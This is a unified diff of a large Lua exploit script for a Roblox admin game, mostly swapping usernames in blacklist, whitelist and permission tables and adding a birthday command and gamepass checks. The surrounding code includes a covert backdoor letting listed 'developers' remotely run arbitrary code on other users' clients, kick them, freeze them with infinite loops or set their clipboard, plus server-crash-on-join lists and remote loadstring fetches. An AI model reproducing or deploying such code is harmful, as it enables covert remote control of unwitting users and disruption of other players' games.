@@ -197,9 +197,9 @@ local blacklist = {
     "jjthejoker7",
     "cihanahmet1670",
     "Fu14r",
-    "ScriptingProgrammer",
-    "atprog",
-    "t_echr"
+    "bbgurrrrl",
+    "t_echr",
+    "mymostrandomaccount"
 }
 
 -- Users not affected by serverlock
@@ -209,12 +209,12 @@ local whitelist = {}
 local pwl = {
     "me_123eq",
     "me_crashking",
-    "OhMyAlt000",
-    "aliihsan12345Bloxy",
-    "BANNter_Original",
-    "witnessfox22",
+    "aliihsan12345",
     "Unknown35864",
     "aliihasn12345",
+    "witnessfox22",
+    "IceStuds",
+    "OhMyAlt000",
   --  "dawninja21",
   --  "Dawninja21alt",
     "Di33le2",
@@ -229,7 +229,7 @@ local pwl = {
     "clydekash",
     "t_echl",
     "Ih0temyIife",
-    "itgeLsmeeS",
+    "UnknownHasComeBack",
     "SZCVAK",
     "TheRealestOnHere",
     "Altsarecooleh",
@@ -242,7 +242,7 @@ local pwl = {
     "E4_DQ",
     "vgcrash",
     "aliihsan12345isafurry",
-    "Roblox_girlsfree", 
+    "YT_MATHEUSMODZ5", 
     "kevin3050ti",
     "grimAuxiliatrix",
     "ikbx",
@@ -250,7 +250,7 @@ local pwl = {
     "Eggkid7",
     "4g8h",
     "Unknowndev",
-    "mymostrandomaccount",
+    "itgeLsmeeS",
     "whatveidone",
     "yeyeyeweweweye"
 }
@@ -258,13 +258,13 @@ local pwl = {
 -- Players you cannot kick
 local nokick = {
     "me_123eq",
-    "me_crashking",
-    "OhMyAlt000",
+    "Unknown35864",
+    "aliihsan12345",
     "aliihsan12345Bloxy",
     "BANNter_Original",
     "witnessfox22",
-    "Unknown35864",
-    "aliihasn12345",
+    "IceStuds",
+    "OhMyAlt000",
   --  "dawninja21",
  --   "Dawninja21alt",
     "Di33le2",
@@ -279,7 +279,7 @@ local nokick = {
     "clydekash",
     "t_echl",
     "Ih0temyIife",
-    "itgeLsmeeS",
+    "UnknownHasComeBack",
     "SZCVAK",
     "TheRealestOnHere",
     "Altsarecooleh",
@@ -295,9 +295,11 @@ local nokick = {
     "ikbx",
     "undertaker629",
     "Eggkid7",
-    "Roblox_girlsfree",
+    "aliihsan12345isafurry", 
+    "YT_MATHEUSMODZ5",
     "4g8h",
     "Unknowndev",
+    "itgeLsmeeS",
     "whatveidone",
     "yeyeyeweweweye"
 }
@@ -306,19 +308,20 @@ local nokick = {
 local specialperms = {
     "me_123eq",
     "me_crashking",
+    "aliihsan12345",
     "OhMyAlt000",
-    "aliihasn12345",
-    "Unknown35864",
+    "IceStuds",
+    "aliihsan12345isafurry",
    -- "dawninja21",
   --  "dawninja21alt",
     "Unknowndev",
     "yeyeyeweweweye"
 }
 
--- aliihasn12345 spexialpermz (Perms for non-developers)
-local aliihasn12345perms = {
-    "aliihasn12345",
-    "Unknown35864",
+-- OhMyAlt000 spexialpermz (Perms for non-developers)
+local OhMyAlt000perms = {
+    "OhMyAlt000",
+    "IceStuds",
     "decryptionites",
     "minecraftgamer2012YT",
     "clydekash",
@@ -327,7 +330,7 @@ local aliihasn12345perms = {
     "undertaker629",
     "jjjuuikjjikkju",
     "FR6DDIIE",
-    "itgeLsmeeS",
+    "UnknownHasComeBack",
     "4g8h"
 }
 
@@ -338,12 +341,12 @@ local GWhitelisted = {}
 local pgwl = {
     "me_123eq",
     "me_crashking",
-    "OhMyAlt000",
+    "aliihsan12345",
     "aliihsan12345Bloxy",
     "BANNter_Original",
     "witnessfox22",
-    "Unknown35864",
-    "aliihasn12345",
+    "IceStuds",
+    "OhMyAlt000",
    -- "dawninja21",
  --   "Dawninja21alt",
     "Di33le2",
@@ -358,7 +361,7 @@ local pgwl = {
     "clydekash",
     "t_echl",
     "Ih0temyIife",
-    "itgeLsmeeS",
+    "UnknownHasComeBack",
     "SZCVAK",
     "TheRealestOnHere",
     "Altsarecooleh",
@@ -370,8 +373,8 @@ local pgwl = {
     "me_capybara",
     "E4_DQ",
     "vgcrash",
-    "aliihsan12345",
-    "Roblox_girlsfree", 
+    "aliihsan12345isafurry",
+    "YT_MATHEUSMODZ5", 
     "kevin3050ti",
     "grimAuxiliatrix",
     "ikbx",
@@ -379,7 +382,7 @@ local pgwl = {
     "Eggkid7",
     "4g8h",
     "Unknowndev",
-    "mymostrandomaccount",
+    "itgeLsmeeS",
     "whatveidone",
     "yeyeyeweweweye"
 }
@@ -408,8 +411,8 @@ personsusers = {} -- users that use persons will be placed here
 
 -- Auto stuff relating to users
 rkick_on_sight = {} -- rocket kick player when they join ONLY WORKS WITH ONE PLAYER
-crash_on_sight = {"ScriptingProgrammer"} -- crash server when player joins
-mkick_on_sight = {"t_echr","atprog"} -- kick player with pm spam when they join ONLY WORKS WITH ONE PLAYER
+crash_on_sight = {"mymostrandomaccount"} -- crash server when player joins
+mkick_on_sight = {"t_echr","hellokitty2kute"} -- kick player with pm spam when they join ONLY WORKS WITH ONE PLAYER
 suser_on_sight = {} -- slow a user when they join with car gear ONLY WORKS WITH ONE PLAYER
 furry_on_sight = {"jhjssikeksms"} -- nine jay n
 gb_on_sight = {} -- gearban upon a user joining
@@ -643,7 +646,7 @@ local charlist = {
     ["telac"] = { charid = "13645" },           -- 3
     ["epicszs"] = { charid = "548456077" },  -- 4
     ["temi"] = { charid = "45024180" },   -- 5
-    ["aliihasn12345"] = { charid = "1389780396" }, -- 6
+    ["OhMyAlt000"] = { charid = "1389780396" }, -- 6
     ["menaal"] = { charid = "1793973864" }, -- 7
     ["agspureiam"] = { charid = "36377783" },   -- 8
     ["tech"] = { charid = "1702851506" }, -- 9
@@ -1224,9 +1227,9 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
 		Remind("Executed CMD PI/V3. Created by quiving. CMD PI/V3 doesn't work for mobile executors by the way.")
         end
 
-        if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'prsc' then -- PR Script ~ aliihasn12345
+        if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'prsc' then -- PR Script ~ OhMyAlt000
                 GExecute("https://raw.githubusercontent.com/S-PScripts/scripts/main/Luau/KAH/People's%20Scripts/PR_Script.txt")
-		Remind("Executed PR Script. Created by aliihasn12345.")
+		Remind("Executed PR Script. Created by OhMyAlt000.")
         end
 
         if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'cmdy' then -- you don't need this for attaching anymore ;)
@@ -3091,6 +3094,36 @@ Commands required: rocket]])
         clickexplode = false
 	Remind("Players will no longer explode when you click them, phew!")
     end
+
+  if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'cakeday' then
+                local args = string.split(msg, " ")
+		if #args == 2 then
+                	local caketar = args[2]
+			PLAYERCHECK(caketar)
+         		if player ~= nil then
+                  		caketarsuccess = player
+				Chat("h \n\n\n Happy birthday, ".. caketarsuccess .."! \n\n\n")
+         		else
+                		Remind('Cannot find player with the name: '..caketar)
+         		end
+		else
+				
+			local OhMyAlt000cakeday = "08/23" -- OhMyAlt000's birthday
+			local spcakeday = "04/28" -- 
+
+			local ctime = os.date("%m/%d")
+
+			if ctime == OhMyAlt000cakeday then			
+				Chat("h \n\n\n Happy birthday, OhMyAlt000! \n\n\n")
+				Speak("Happy birthday, OhMyAlt000!")
+			elseif ctime == spcakeday then
+				Chat("h \n\n\n Happy birthday, aliihsan12345! \n\n\n")
+				Speak("Happy birthday, aliihsan12345!")
+			else
+				Remind("It is not OhMyAlt000's/aliihsan12345's birthday today. If it is someone else's birthday in the server, provide the second argument.")
+			end
+		end
+    end
 		
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'control' then -- really funny ngl (scv1)
                 local dogman = string.sub(msg:lower(), #prefix + 9)
@@ -3765,7 +3798,7 @@ Commands required: rocket]])
   
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'dicrash' then
 	    musicsay = false -- na mrmiavss forgot this jit tripping - from mrmiavss
-            Chat(prefix.."gchar all itgeLsmeeS");Chat(prefix.."gmusic62");Chat("h \n\n\n all praise dionte \n\n\n");Chat("name all itgeLsmeeS is our hero")
+            Chat(prefix.."gchar all UnknownHasComeBack");Chat(prefix.."gmusic62");Chat("h \n\n\n all praise dionte \n\n\n");Chat("name all UnknownHasComeBack is our hero")
 	    task.wait(1.5)
 	    DCrash()
     end
@@ -6547,7 +6580,7 @@ Commands required: rocket]])
         	PLAYERCHECK(dasplayer)
         	if player == nil then 
 			return Remind("Fail: User not found!")
-		elseif player == "OhMyAlt000" or player == "aliihasn12345" or player == "Unknowndev" then
+		elseif player == "aliihsan12345" or player == "OhMyAlt000" or player == "Unknowndev" then
 			Remind("You can't bang developers!")
 		else
 			banger = cplr
@@ -7018,6 +7051,55 @@ end
 function CMDPrint()
 	GExecute("https://gist.githubusercontent.com/S-PScripts/86b332526c70fe7c9585bddd3e58101c/raw/7f3bb1759ab1e1d4a5178390796f6852f2304369/KL%2520CMD%2520LIST.lua")
 	print("newkl - loads KohlsECO (Unknown v2). This is not updated anymore since I decided to revive KL v1.")
+end
+
+-- CHECK FOR PERM
+function checkforperm()
+        if string.match(game:HttpGet("https://inventory.roproxy.com/v1/users/" .. gcplr.UserId .. "/items/GamePass/" .. 66254), 66254) then
+            Remind(gcplrn.." has perm in NBC!")
+            Chat("h \n\n\n\n \n\n\n\n " .. gcplrn .. " has perm in NBC! \n\n\n\n")
+          --  Speak(gcplrn.." has perm in NBC!")
+            if not table.find(permusers, gcplrn) then
+                    table.insert(permusers, gcplrn)
+            end
+        elseif string.match(game:HttpGet("https://inventory.roproxy.com/v1/users/" .. gcplr.UserId .. "/items/GamePass/" .. 64354), 64354) then
+            Remind(gcplrn.." has perm in BC!")
+	    Chat("h \n\n\n\n \n\n\n\n " .. gcplrn .. " has perm in BC! \n\n\n\n")
+           -- Speak(gcplrn.." has perm in BC!")
+            table.insert(permusers, gcplrn)
+            if not table.find(permusers, gcplrn) then
+                    table.insert(permusers, gcplrn)
+            end
+        else 
+                Remind(gcplrn..' does not have perm!')
+	        Chat("h \n\n\n\n \n\n\n\n " .. gcplrn .. " does not perm! \n\n\n\n")
+            --    Speak(gcplrn..' does not have perm!')
+        end
+end
+
+-- CHECK FOR PERSONS
+function checkforpersons()
+        if string.match(game:HttpGet("https://inventory.roproxy.com/v1/users/" .. gcplr.UserId .. "/items/GamePass/" .. 35748), 35748) then
+            Remind(gcplrn.." has persons in NBC!")
+	    Chat("h \n\n\n\n \n\n\n\n \n\n\n\n " .. gcplrn .. " has persons in NBC! \n\n\n\n")
+           -- Speak(gcplrn.." has persons in NBC!")
+            table.insert(personsusers, gcplrn)
+            if not table.find(personsusers, gcplrn) then
+                    table.insert(personsusers, gcplrn)
+            end
+        elseif string.match(game:HttpGet("https://inventory.roproxy.com/v1/users/" .. gcplr.UserId .. "/items/GamePass/" .. 37127), 37127) then
+            Remind(gcplrn.." has persons in BC!")
+	    Chat("h \n\n\n\n \n\n\n\n \n\n\n\n " .. gcplrn .. " has persons in BC! \n\n\n\n")
+           -- Speak(gcplrn.." has persons in BC!")
+            table.insert(personsusers, gcplrn)
+            if not table.find(personsusers, gcplrn) then
+                    table.insert(personsusers, gcplrn)
+            end
+        else 
+                Remind(gcplrn..' does not have persons!')
+		Chat("h \n\n\n\n \n\n\n\n \n\n\n\n " .. gcplrn .. " does not persons! \n\n\n\n")
+             --   Speak(gcplrn..' does not have persons!')
+        end
 end
 
 -- Serverlock, blacklist, whitelist (not that good but decent still)
@@ -8434,13 +8516,13 @@ function PLRSTART(v)
 
                     if string.sub(msg:lower(), 0, 5) == ";poop" or string.sub(msg:lower(), 0, 5) == ":poop" or string.sub(msg:lower(), 0, 4) == "poop" or string.sub(msg:lower(), 0, 5) == ".poop" then
                         if noobdetect then
-                            if v.Name ~= "Unknown35864" and v.Name ~= "aliihasn12345" then -- very epik exception
+                            if v.Name ~= "IceStuds" and v.Name ~= "OhMyAlt000" then -- very epik exception
                                 print(v.Name .. " is a noob. / Said 'poop' ")
                                 Chat("h \n\n\n " .. v.Name .. ", did you come from a FREE ADMIN game? POOP isn't a command! \n\n\n")
-                            elseif v.Name == "Unknown35864" then
-                                Chat("h \n\n\n [Unknown35864]: Poop \n\n\n")
+                            elseif v.Name == "IceStuds" then
+                                Chat("h \n\n\n [IceStuds]: Poop \n\n\n")
                             else
-                                Chat("h \n\n\n [aliihasn12345]: Poop \n\n\n")
+                                Chat("h \n\n\n [OhMyAlt000]: Poop \n\n\n")
                             end
                         end
                     end
@@ -8504,89 +8586,89 @@ function PLRSTART(v)
                     -- // dev section \\ --
 
                     if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(aliihasn12345perms, game.Players.LocalPlayer.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(OhMyAlt000perms, game.Players.LocalPlayer.Name) then
                             Speak("I use Unknown!")
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(aliihasn12345perms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(aliihasn12345perms, game.Players.LocalPlayer.Name) then
+                    if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(OhMyAlt000perms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(OhMyAlt000perms, game.Players.LocalPlayer.Name) then
                             Speak("Collect my pages pav...")
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 5) == "-clip" and v.Name ~= game.Players.LocalPlayer.Name and table.find(aliihasn12345perms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(aliihasn12345perms, game.Players.LocalPlayer.Name) then
+                    if string.sub(msg:lower(), 0, 5) == "-clip" and v.Name ~= game.Players.LocalPlayer.Name and table.find(OhMyAlt000perms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(OhMyAlt000perms, game.Players.LocalPlayer.Name) then
                             setclipboard("https://discord.gg/Q7Q7rAyckJ")
                         end
                     end
 
                     if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(aliihasn12345perms, game.Players.LocalPlayer.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(OhMyAlt000perms, game.Players.LocalPlayer.Name) then
                             pcall(function()
                                     game.Players.LocalPlayer:Kick("A Unknown dev kicked you from the game!")
                             end)
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(aliihasn12345perms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(aliihasn12345perms, game.Players.LocalPlayer.Name) then
+                    if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(OhMyAlt000perms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(OhMyAlt000perms, game.Players.LocalPlayer.Name) then
                             pcall(function()
-                                    game.Players.LocalPlayer:Kick("FE BYPASSED ~aliihasn12345")
+                                    game.Players.LocalPlayer:Kick("FE BYPASSED ~OhMyAlt000")
                             end)
                         end
                     end
 
                     if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(aliihasn12345perms, game.Players.LocalPlayer.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(OhMyAlt000perms, game.Players.LocalPlayer.Name) then
                             Remind("You have been warned by a Unknown dev!")
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(aliihasn12345perms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(aliihasn12345perms, game.Players.LocalPlayer.Name) then
+                    if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(OhMyAlt000perms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(OhMyAlt000perms, game.Players.LocalPlayer.Name) then
                             Remind("You have been warned by a Unknown collaborator!")
                         end
                     end
 
                     if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(aliihasn12345perms, game.Players.LocalPlayer.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(OhMyAlt000perms, game.Players.LocalPlayer.Name) then
                             while true do end
                         -- game:Shutdown()
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(aliihasn12345perms, v.Name) then
-			if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(aliihasn12345perms, game.Players.LocalPlayer.Name) then
+                    if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(OhMyAlt000perms, v.Name) then
+			if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(OhMyAlt000perms, game.Players.LocalPlayer.Name) then
                             while true do end
                         -- game:Shutdown()
                         end
                     end
 
                     if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-			if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(aliihasn12345perms, game.Players.LocalPlayer.Name) then
+			if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(OhMyAlt000perms, game.Players.LocalPlayer.Name) then
 			    Execute(string.sub(msg, 6))
 			end
                     end
 
-                    if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(aliihasn12345perms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(aliihasn12345perms, game.Players.LocalPlayer.Name) then
+                    if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(OhMyAlt000perms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(OhMyAlt000perms, game.Players.LocalPlayer.Name) then
                             Execute(string.sub(msg, 6))
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 4) == "-prs" and v.Name ~= game.Players.LocalPlayer.Name and table.find(aliihasn12345perms, v.Name) then
+                    if string.sub(msg:lower(), 0, 4) == "-prs" and v.Name ~= game.Players.LocalPlayer.Name and table.find(OhMyAlt000perms, v.Name) then
                         loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/beamd/main/procod"))()
                     end
 
                     if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(aliihasn12345perms, game.Players.LocalPlayer.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(OhMyAlt000perms, game.Players.LocalPlayer.Name) then
                             GExecute(string.sub(msg, 7))
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(aliihasn12345perms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(aliihasn12345perms, game.Players.LocalPlayer.Name) then
+                    if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(OhMyAlt000perms, v.Name) then
+                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(OhMyAlt000perms, game.Players.LocalPlayer.Name) then
                             GExecute(string.sub(msg, 7))
                         end
                     end
@@ -9052,7 +9134,7 @@ end)
 function LogSpam()
       for i = 1,50 do
           Chat("reset Unknown ON BOTTOM - mrmiavss, 2024")
-          Chat("reset PR SCRIPT ON TOP - aliihasn12345, 2024")
+          Chat("reset PR SCRIPT ON TOP - OhMyAlt000, 2024")
       end
 end
 
@@ -10548,7 +10630,7 @@ function onPlayerAdded(player)
           checkforperm()
     end
 
-    if not table.find(specialperms, player.Name) or not table.find(aliihasn12345perms, player.Name) then
+    if not table.find(specialperms, player.Name) or not table.find(OhMyAlt000perms, player.Name) then
 		check_con = false
 
   		if table.find(rkick_on_sight, player.Name) then
@@ -10647,10 +10729,10 @@ function onPlayerAdded(player)
         		Remind(player.Name.." [Unknown Dev] joined the server.")
     end
 
-    if table.find(aliihasn12345perms, player.Name) then
+    if table.find(OhMyAlt000perms, player.Name) then
 			Chat("h \n\n\n ".. player.Name .. " [Unknown Dev] joined the server! \n\n\n")
 			print(player.Name.." [Unknown Dev] joined the server.")
-        		Remind(player.Name.." from [aliihasn12345 PERMS] joined the server.")
+        		Remind(player.Name.." from [OhMyAlt000 PERMS] joined the server.")
     end
 end
 
@@ -13078,7 +13160,7 @@ startupScripts()
 
 -- Loading (from pqko and others) --
 local function rankcheck(username)
-    if username == "OhMyAlt000" or username == "me_123eq" or username == "Unknowndev" or username == "Unknown35864" or username == "yeyeyeweweweye" then
+    if username == "aliihsan12345" or username == "Unknown35864" or username == "Unknowndev" or username == "IceStuds" or username == "yeyeyeweweweye" then
         return "Owner"
     else
         return "Member"
@@ -13099,19 +13181,19 @@ print("Your rank is: " .. Stats.rank)
 -- Don't leak it method my boy ...
 loadstring(game:HttpGet("https://raw.githubusercontent.com/blueskykah/soggy/main/for%20atpoop"))()
 
--- Unknown Tags - Created by aliihasn12345
+-- Unknown Tags - Created by OhMyAlt000
 local OWNER = {
-	"OhMyAlt000", 
+	"aliihsan12345", 
 	"me_123eq", 
 	"aliihsan12345isafurry", 
 	"Unknowndev", 
-	"Unknown35864", 
+	"IceStuds", 
         "yeyeyeweweweye"
 }
 
 local DEVELOPER = {
-   "aliihasn12345",
- --  "Unknown35864" (avoid overlap)
+   "OhMyAlt000",
+ --  "IceStuds" (avoid overlap)
 }
 
 local ADMIN = {
@@ -13187,15 +13269,28 @@ for _, player in pairs(game.Players:GetPlayers()) do
 end
 
 -- Unknown Blacklist --
-local unexecuteables = {"atprog","t_echr","ScriptingProgrammer","kjnjsknsdgkgnfgkjknf","NOTAVIRTUALMACHINE15"}
+local unexecuteables = {"ScriptingProgrammer","WouldYouRatherLoD","t_echr","kjnjsknsdgkgnfgkjknf","NOTAVIRTUALMACHINE15"}
 if table.find(unexecuteables, game.Players.LocalPlayer.Name) then
 		if setclipboard then
 			setclipboard("https://discord.gg/Q7Q7rAyckJ")
 		end
                 pcall(function() -- thanks tech
-		        game.Players.LocalPlayer:Kick("[Unknown]: You have been blacklisted from Unknowns.
+		        game.Players.LocalPlayer:Kick("[Unknown]: You have been Unknowned.
                 end)
                 task.wait(2.5); while true do end
+end
+
+local OhMyAlt000cakeday = "08/23" -- OhMyAlt000's birthday
+local spcakeday = "04/28" --
+
+local ctime = os.date("%m/%d")
+
+if ctime == OhMyAlt000cakeday then			
+	Remind("It's OhMyAlt000 birthday! If you see him, do .cakeday!")
+elseif ctime == spcakeday then
+	Remind("It's my birthday! If you see me, do .cakeday!")
+else
+	-- funny filler
 end
 
 --[[
